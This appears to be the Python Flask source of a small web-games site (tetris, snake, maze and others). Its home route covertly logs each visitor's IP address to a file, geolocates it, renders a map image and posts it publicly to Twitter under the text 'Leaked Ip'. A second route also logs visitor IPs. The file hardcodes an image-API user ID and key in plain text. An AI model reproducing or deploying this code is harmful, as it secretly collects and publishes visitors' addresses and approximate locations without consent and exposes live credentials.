from flask import Flask, render_template, request, redirect
import tweepy
import random
import requests
import folium
import os
import json
app = Flask(__name__)
# Keys/Tokens for twitter bot
consumer_key = os.getenv('consumer_key')
consumer_secret = os.getenv('consumer_secret')
access_token = os.getenv('access_token')
access_token_secret = os.getenv('access_token_secret')
#authenitcation for twitter bot
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret)
api = tweepy.API(auth)

gamelist = ["tetris", "snake", "trivia", "soccer penalties", "pacman", "fox and hounds", "mars lander", "maze", "solitare", "maze room", "missionaries and cannibals", "virus","Chose-own-adventure"]
number = 0
@app.route('/')
def home():
  with open( "counter.txt", "r" ) as f:
    count = f.read()

  count = int(count)
  with open( "counter.txt", "w" ) as f:
    f.write( str(count+1) )
  # this gets the ip from the user. 
  ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
  #appends ip to text doccument
  ip = open("ip.txt","a")
  ip.write(ip_addr + "\n")
  ip.close()
  ip_addr = str(ip_addr)
  print(ip_addr)
    

  ip_address = ip_addr
  # Replace with the IP address you want to plot
  url = f'https://ipapi.co/{ip_addr}/json/'
  response = requests.get(url)
  
  
  data = response.json()

  lat = data.get('latitude')
  lon = data.get('longitude')
  print(lat)
  print(lon)
  lat = float(lat)
  lon = float(lon)  
  # Create a Folium map centered on the IP address location
  ma = folium.Map(location=[lat, lon], zoom_start=6)
  
  # Add a marker for the IP address location
  folium.Marker(location=[lat, lon], popup=ip_address).add_to(ma)
  
  # Save the map as an HTML file
  ma.save("map.html")
  
  
  HCTI_API_ENDPOINT = "https://hcti.io/v1/image"
  HCTI_API_USER_ID = '87634cfb-4da8-4e9c-9529-ce8277a5de82'
  HCTI_API_KEY = '5d43bb55-1231-4437-99e8-2872912043cc'
  
  with open("map.html", "r") as f:
      html_code = f.read()
  
  data = { 'html': html_code,
           'css': ".box { color: white; background-color: #0f79b9; padding: 10px; font-family: Roboto }",
           'google_fonts': "Roboto" }
  
  image = requests.post(url=HCTI_API_ENDPOINT, data=data, auth=(HCTI_API_USER_ID, HCTI_API_KEY))
  
  image_url = image.json()['url']
  
  # Download the image and save it as a binary file
  response = requests.get(image_url)
  with open("image.png", "wb") as f:
      f.write(response.content)
  
  print("Image saved as image.png")
  # posts ip on twitter. The lucky number thing is to avoid duplicate messages which crashes the bot
  tweet_text = "Leaked Ip: " + ip_addr + " Ip Number: "+ str(count)
  image_path = "image.png"
  media = api.media_upload(image_path)
  api.update_status(status=tweet_text, media_ids=[media.media_id])
  return render_template( "index.html", ip_addr = ip_addr)
  
@app.route('/adventure')
def adventure_display():
  return render_template(
    "adventure.html",
  )
@app.route('/zion')
def zion():
  return render_template(
    "zion.html",
  )
@app.route('/factors')
def factors_display():
	return render_template(
		"factors.html",
  )

@app.route('/proxy-client')
def proxy_client():
    ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
    ip = open("ip.txt","a")
    ip.write(ip_addr + "\n")
    ip.close()
    return '<h1> Your IP address is:' + ip_addr
  
@app.route('/tetris')
def tetris_display():
  return render_template(
    "tetris.html",
  )
@app.route('/snake')
def snake_display():
  return render_template(
    "snake.html",
  )
@app.route('/trivia')
def trivia_display():
  return render_template(
    "trivia.html",
  )
@app.route('/soccer penalties')
def soccer_display():
  return render_template(
    "soccer penalties.html",
  )
@app.route('/virus')
def virus_display():
  return render_template(
    "virus.html",
  )
@app.route('/fox and hounds')
def fox_display():
  return render_template(
    "fox and hounds.html",
  )
@app.route('/mars lander')
def mars_display():
  return render_template(
    "mars lander.html",
  )
@app.route('/maze')
def maze_display():
  return render_template(
    "maze.html",
  )
@app.route('/solitare')
def solitare():
  return render_template(
    "solitare.html",
  )
@app.route('/maze room')
def mazes_display():
  return render_template(
    "maze room.html",
  )
@app.route('/missionaries and cannibals')
def missionary_display():
  return render_template(
    "missionaries and cannibals.html",
  )

@app.route('/result',methods=['POST', 'GET'])
def result():
    output = request.form.to_dict()
    print(output)
    name = output["name"]
    print(name)
    name = name.lower()
    print(name)
    if name in gamelist:
      return redirect('/' + name)
    return render_template('index.html', name = name)
    
@app.errorhandler(404)
def not_found(e):
  return render_template('404.html')
  
if __name__ == '__main__':
    app.run(host='0.0.0.0')
  #<embed src="https://www.towardsandbeyond.com/" style="width:500px; height: 300px;">
